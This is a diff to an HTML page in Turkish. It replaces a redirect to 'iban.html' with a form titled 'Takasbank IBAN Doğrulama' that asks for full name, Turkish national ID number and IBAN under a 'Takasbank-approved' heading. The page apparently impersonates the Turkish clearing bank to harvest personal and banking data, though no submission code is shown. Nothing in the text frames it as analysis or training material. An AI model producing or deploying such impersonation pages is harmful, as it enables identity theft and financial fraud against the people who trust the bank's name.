@@ -3,10 +3,20 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; URL='iban.html'" />
-    <title>Yönlendiriliyor...</title>
+    <title>Takasbank IBAN Doğrulama</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <p>Yönlendiriliyorsunuz... Eğer yönlendirme başlamazsa <a href="iban.html">buraya tıklayın</a>.</p>
+    <div class="container">
+        <img src="logo.png" alt="Logo" class="logo">
+        <h1>TAKASBANK ONAYLI IBAN BİLDİRİMİ</h1>
+        <p>Lütfen aşağıdaki bilgileri eksiksiz doldurunuz:</p>
+        <form>
+            <input type="text" id="fullname" placeholder="Ad Soyad" required><br><br>
+            <input type="text" id="tc" placeholder="T.C. Kimlik No" required><br><br>
+            <input type="text" id="iban" placeholder="TR00 0000 0000 0000 0000 0000 00" required><br><br>
+            <button type="submit">Gönder</button>
+        </form>
+    </div>
 </body>
 </html>
